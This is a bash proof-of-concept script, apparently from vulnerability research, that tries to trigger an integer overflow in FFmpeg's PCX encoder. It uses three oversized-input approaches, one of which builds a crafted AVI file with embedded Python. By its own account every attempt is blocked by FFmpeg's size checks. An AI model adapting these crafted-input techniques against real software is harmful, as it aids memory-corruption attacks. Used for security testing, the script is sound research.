#!/usr/bin/env bash
# PoC runner for VULN 001: Integer Overflow in max_pkt_size in PCX Encoder
# File: libavcodec/pcxenc.c, line 136
#
# FINDINGS: The vulnerability EXISTS as code-level integer overflow in pcxenc.c:136
# but has TWO layers of mitigation that prevent triggering via standard ffmpeg CLI:
#
# Mitigation 1: av_image_check_size() in libavutil/imgutils.c uses stride = 8*width
#   to validate that total image size fits in 32-bit int.
#   Mathematical proof: PCX overflow requires width*height > 357,913,941
#   but av_image_check_size only allows width*height < 268,435,455 (8w*h < INT_MAX).
#   These are mutually exclusive: NO valid dimensions can trigger both conditions.
#
# Mitigation 2: pcx_rle_encode() (pcxenc.c:54) validates dst_size >= 2*line_bytes*nplanes
#   before writing, catching OOB even if mitigation 1 were bypassed.
#
# All three approach attempts below confirm this:
#   Approach A: lavfi color source → rejected by av_image_check_size in lavfi filter
#   Approach B: crafted AVI container → rawvideo decoder rejects via av_image_check_size
#   Approach C: rawvideo demuxer → rejected at rawvideodec.c:73

BIN="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
export ASAN_OPTIONS="abort_on_error=1:print_stacktrace=1:detect_leaks=0"

echo "[*] VULN 001: Integer Overflow in max_pkt_size -> OOB Heap Write (PCX Encoder)"
echo "[*] File: libavcodec/pcxenc.c:136"
echo "[*] Binary: $BIN"
echo ""

if [ ! -x "$BIN" ]; then
    echo "[ERROR] ffmpeg binary not found at $BIN"
    exit 2
fi

# Print theoretical overflow analysis
echo "[*] Running overflow analysis..."
python3 "$(dirname "$0")/vuln_001_gen.py" || true
echo ""

POC_RESULT=0

# -------- Approach A: lavfi color source --------
echo "=========================================="
echo "[Approach A] lavfi color source s=22000x35000"
echo "=========================================="
set +e
"$BIN" \
    -f lavfi \
    -i "color=c=black:s=22000x35000:r=1" \
    -vframes 1 \
    -vf "format=rgb24" \
    -vcodec pcx \
    -update 1 \
    /tmp/poc_a_out.pcx \
    2>&1
EXIT_A=$?
echo "[Approach A] Exit code: $EXIT_A"
echo ""

# -------- Approach B: crafted AVI with 22000x35000 header --------
echo "=========================================="
echo "[Approach B] Crafted AVI file claiming 22000x35000"
echo "=========================================="
python3 << 'PYEOF'
import struct
import sys

def make_chunk(fourcc, data):
    if isinstance(fourcc, str): fourcc = fourcc.encode()
    return fourcc + struct.pack('<I', len(data)) + data + (b'\x00' if len(data) % 2 else b'')

def make_list(fourcc, data):
    if isinstance(fourcc, str): fourcc = fourcc.encode()
    return b'LIST' + struct.pack('<I', 4 + len(data)) + fourcc + data

width, height, fps = 22000, 35000, 1
avih_data = struct.pack('<IIIIIIIIIIIIII',
    1000000//fps, width*height*3*fps, 0, 0x10, 1, 0, 1, width*height*3, width, height, 0,0,0,0)
avih = make_chunk('avih', avih_data)
strh_data = struct.pack('<4s4sIHHIIII', b'vids', b'DIB ', 0, 0, 0, 0, 1, fps, 0)
strh_data += struct.pack('<IIII', 1, width*height*3, 0xFFFFFFFF, 0)
strh_data += struct.pack('<hhhh', 0, 0, width, height)
strh = make_chunk('strh', strh_data)
bih = struct.pack('<IiiHHIIiiII', 40, width, height, 1, 24, 0, width*height*3, 0,0,0,0)
strf = make_chunk('strf', bih)
strl = make_list('strl', strh + strf)
hdrl = make_list('hdrl', avih + strl)
frame_chunk = make_chunk('00dc', b'\xff\x80\x00' * 3)  # 3 pixels
movi = make_list('movi', frame_chunk)
idx1 = make_chunk('idx1', struct.pack('<4sIII', b'00dc', 0x10, 4, 9))
avi_data = hdrl + movi + idx1
riff = b'RIFF' + struct.pack('<I', 4+len(avi_data)) + b'AVI ' + avi_data
with open('/tmp/poc_crafted.avi', 'wb') as f:
    f.write(riff)
print(f"[*] Crafted AVI written: {len(riff)} bytes, claims {width}x{height}")
PYEOF

"$BIN" \
    -i /tmp/poc_crafted.avi \
    -vcodec pcx \
    -update 1 \
    /tmp/poc_b_out.pcx \
    2>&1
EXIT_B=$?
echo "[Approach B] Exit code: $EXIT_B"
echo ""

# -------- Approach C: rawvideo with stdin/pipe --------
echo "=========================================="
echo "[Approach C] rawvideo demuxer with 22000x35000"
echo "=========================================="
dd if=/dev/zero bs=1 count=132 2>/dev/null | \
"$BIN" \
    -f rawvideo \
    -s 22000x35000 \
    -pix_fmt rgb24 \
    -i pipe:0 \
    -vframes 1 \
    -vcodec pcx \
    -update 1 \
    /tmp/poc_c_out.pcx \
    2>&1
EXIT_C=$?
echo "[Approach C] Exit code: $EXIT_C"
echo ""

# Cleanup
rm -f /tmp/poc_a_out.pcx /tmp/poc_b_out.pcx /tmp/poc_c_out.pcx /tmp/poc_crafted.avi

echo "=========================================="
echo "[Summary]"
echo "  Approach A (lavfi): Exit=$EXIT_A"
echo "  Approach B (AVI):   Exit=$EXIT_B"
echo "  Approach C (raw):   Exit=$EXIT_C"
echo ""
echo "[!] The vulnerability INTEGER OVERFLOW exists in pcxenc.c:136"
echo "    but is blocked by av_image_check_size() in ALL tested code paths."
echo "    The overflow would require width*height>357M but av_image_check_size"
echo "    limits to width*height<268M (8w*h < INT_MAX) - mutually exclusive."
echo ""
echo "    Additionally, pcx_rle_encode() bounds check (pcxenc.c:54) provides"
echo "    a second layer of protection even if the first were bypassed."
echo "=========================================="

# Return non-zero to signal PoC could not demonstrate the crash
exit 1
